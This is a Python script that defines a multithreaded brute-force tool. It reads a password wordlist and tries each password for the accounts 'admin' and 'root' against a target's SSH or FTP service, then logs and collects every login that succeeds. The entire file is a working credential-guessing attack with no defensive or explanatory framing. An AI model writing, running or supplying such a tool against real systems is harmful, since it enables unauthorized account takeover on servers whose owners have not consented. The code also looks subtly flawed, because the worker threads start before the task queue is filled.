import socket
import threading
import queue
import logging

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

class BruteForcer:
    def __init__(self, target, port, service, wordlist_path, max_threads=10):
        self.target = target
        self.port = port
        self.service = service
        self.wordlist_path = wordlist_path
        self.max_threads = max_threads
        self.results = []
        self.lock = threading.Lock()

    def load_wordlist(self):
        try:
            with open(self.wordlist_path, 'r', errors='ignore') as f:
                return [line.strip() for line in f if line.strip()]
        except FileNotFoundError:
            logging.error(f"Wordlist not found: {self.wordlist_path}")
            return []

    def check_ssh(self, username, password):
        try:
            import paramiko
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            client.connect(self.target, port=self.port, username=username, password=password, timeout=2)
            with self.lock:
                self.results.append({'status': 'SUCCESS', 'user': username, 'pass': password})
                logging.info(f"[+] SSH Success: {username}:{password}")
            client.close()
            return True
        except Exception:
            return False

    def check_ftp(self, username, password):
        try:
            import ftplib
            ftp = ftplib.FTP()
            ftp.connect(self.target, self.port, timeout=2)
            ftp.login(username, password)
            with self.lock:
                self.results.append({'status': 'SUCCESS', 'user': username, 'pass': password})
                logging.info(f"[+] FTP Success: {username}:{password}")
            ftp.quit()
            return True
        except Exception:
            return False

    def run(self):
        wordlist = self.load_wordlist()
        if not wordlist:
            return

        tasks = queue.Queue()
        threads = []

        def worker():
            while not tasks.empty():
                username, password = tasks.get()
                if self.service == 'ssh':
                    self.check_ssh(username, password)
                elif self.service == 'ftp':
                    self.check_ftp(username, password)
                tasks.task_done()

        for _ in range(self.max_threads):
            t = threading.Thread(target=worker)
            t.daemon = True
            t.start()
            threads.append(t)

        for pwd in wordlist:
            tasks.put(('admin', pwd))
            tasks.put(('root', pwd))

        tasks.join()
        return self.results